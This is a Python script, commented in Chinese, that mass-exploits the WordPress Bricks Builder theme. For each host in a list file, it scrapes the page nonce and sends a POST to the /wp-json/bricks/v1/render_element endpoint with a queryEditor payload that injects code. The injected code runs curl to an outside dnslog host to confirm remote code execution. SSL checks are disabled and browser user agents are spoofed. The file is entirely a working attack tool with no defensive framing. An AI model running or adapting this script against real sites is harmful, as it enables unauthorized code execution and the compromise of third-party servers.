import re
import requests
from bs4 import BeautifulSoup

# 屏蔽不安全的SSL警告
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# 读取目标主机列表
def read_hosts(file_path):
    with open(file_path, 'r') as file:
        hosts = [line.strip() for line in file.readlines()]
    return hosts

# 获取nonce值
def fetch_nonce(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }
    try:
        response = requests.get(target, headers=headers, timeout=10, verify=False)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        script_tag = soup.find("script", id="bricks-scripts-js-extra")
        if script_tag:
            match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string)
            if match:
                return match.group(1)
    except Exception as e:
        print(f"Failed to fetch nonce from {target}: {e}")
    return None

# 发送利用漏洞的POST请求
def exploit(target, nonce):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Host": target.replace("http://", "").replace("https://", ""),
        "Content-Type": "application/json"
    }
    data = {
        'postId': '1',
        'nonce': nonce,
        'element': {
            'name': 'container',
            'settings': {
                'hasLoop': 'true',
                'query': {
                    'useQueryEditor': True,
                    "queryEditor": "throw new Exception(`curl caoheike.tr8u72v0.dnslog.pw`);",
                    'objectType': 'post'
                }
            }
        }
    }
    
    try:
        response = requests.post(f"{target}/wp-json/bricks/v1/render_element", headers=headers, json=data, timeout=10, verify=False)
        response.raise_for_status()
        print(f"Response from {target}:\n{response.text}")
    except Exception as e:
        print(f"Failed to exploit {target}: {e}")

def main():
    hosts_file = 'host.txt'
    
    hosts = read_hosts(hosts_file)
    for host in hosts:
        full_url = f"http://{host}"
        nonce = fetch_nonce(full_url)
        if nonce:
            print(f"Nonce for {host}: {nonce}")
            exploit(full_url, nonce)
        else:
            print(f"No nonce found for {host}")

if __name__ == "__main__":
    main()
